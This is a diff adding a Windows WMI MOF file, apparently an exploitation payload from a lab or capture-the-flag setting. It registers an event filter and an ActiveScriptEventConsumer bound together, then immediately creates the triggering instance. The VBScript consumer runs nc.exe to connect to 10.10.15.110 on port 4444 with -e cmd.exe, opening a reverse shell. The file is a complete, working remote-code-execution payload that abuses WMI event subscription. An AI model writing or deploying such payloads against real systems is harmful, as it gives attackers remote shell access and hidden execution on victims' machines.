@@ -1,0 +1,37 @@
+#pragma namespace ("\\\\.\\root\\subscription")
+ 
+class MyClass7307
+{
+ [key]
+ string Name;
+};
+ 
+instance of __EventFilter as $FILTER
+{
+    Name = "XPLOIT_TEST_SYSTEM";
+    EventNamespace = "root\\subscription";
+ Query = "SELECT * FROM __InstanceCreationEvent "
+         "WHERE TargetInstance.__class = \"MyClass7307\"";
+ 
+    QueryLanguage = "WQL";
+};
+ 
+instance of ActiveScriptEventConsumer as $CONSUMER
+{
+    Name = "XPLOIT_TEST_SYSTEM";
+    ScriptingEngine = "VBScript";
+ 
+    ScriptText =
+      "Set objShell = CreateObject(\"WScript.Shell\")\n"
+   "objShell.Run \"C:\\Windows\\system32\\cmd.exe /C C:\\nc.exe 10.10.15.110 4444 -e C:\\Windows\\system32\\cmd.exe\"\n";
+};
+ 
+instance of __FilterToConsumerBinding as $BIND
+{
+    Consumer = $CONSUMER ;
+    Filter = $FILTER ;
+};
+ 
+instance of MyClass7307{
+ Name = "Woot";
+};
